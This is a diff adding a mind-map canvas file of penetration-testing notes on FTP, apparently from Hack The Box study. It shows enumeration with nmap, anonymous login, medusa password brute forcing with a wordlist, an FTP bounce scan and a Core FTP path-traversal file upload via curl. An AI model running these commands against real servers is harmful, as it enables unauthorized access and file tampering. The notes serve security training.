@@ -1,0 +1,19 @@
+{
+	"nodes":[
+		{"id":"d6c3d94596b9892d","type":"text","text":"Enumeration\n```\nnchiato@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 \n```","x":-620,"y":-285,"width":696,"height":125},
+		{"id":"c0aa8f28b82865d6","type":"text","text":"Missconfigurations present","x":-750,"y":-13,"width":250,"height":60},
+		{"id":"daca800f1156904d","type":"text","text":"Anonymous Auth\nNo Password\n```\nnchiato@htb[/htb]$ ftp 192.168.2.142    \n```\n```\n```\n```\n                     \nConnected to 192.168.2.142.\n220 (vsFTPd 2.3.4)\nName (192.168.2.142:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt\n226 Directory send OK.\n```","x":-1440,"y":154,"width":824,"height":406},
+		{"id":"0472bb323771536a","type":"text","text":"Brute Forcing  /  Pasword Spraying\n\n```\nnchiato@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp \n```","x":-440,"y":400,"width":590,"height":160},
+		{"id":"0b5fb1f4e4d12849","type":"text","text":"Attacks","x":-276,"y":17,"width":250,"height":60},
+		{"id":"b7ca5ab4d3406bb1","type":"text","text":"Bounce Attack (-b)\n\n```shell-session\nnchiato@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2\n```","x":280,"y":400,"width":520,"height":160},
+		{"id":"1b8b161781f8cc89","x":880,"y":400,"width":660,"height":160,"type":"text","text":"core ftp exploitation (Upload File)\n\n```\ncurl -k -X PUT -H \"Host: <IP>\" --basic -u <username>:<password> --data-binary \"PoC.\" --path-as-is https://<IP>/../../../../../../whoops\n```"}
+	],
+	"edges":[
+		{"id":"888d53c06b358a9b","fromNode":"d6c3d94596b9892d","fromSide":"bottom","toNode":"c0aa8f28b82865d6","toSide":"top"},
+		{"id":"ca9b35bdc7231357","fromNode":"c0aa8f28b82865d6","fromSide":"bottom","toNode":"daca800f1156904d","toSide":"top"},
+		{"id":"1dad7a75166ef8ff","fromNode":"0b5fb1f4e4d12849","fromSide":"bottom","toNode":"0472bb323771536a","toSide":"top"},
+		{"id":"b7bb44ac2771f37a","fromNode":"d6c3d94596b9892d","fromSide":"bottom","toNode":"0b5fb1f4e4d12849","toSide":"top"},
+		{"id":"6ff2cfac88320e3d","fromNode":"0b5fb1f4e4d12849","fromSide":"bottom","toNode":"b7ca5ab4d3406bb1","toSide":"top"},
+		{"id":"5f4c098b0a0f0298","fromNode":"0b5fb1f4e4d12849","fromSide":"bottom","toNode":"1b8b161781f8cc89","toSide":"top"}
+	]
+}
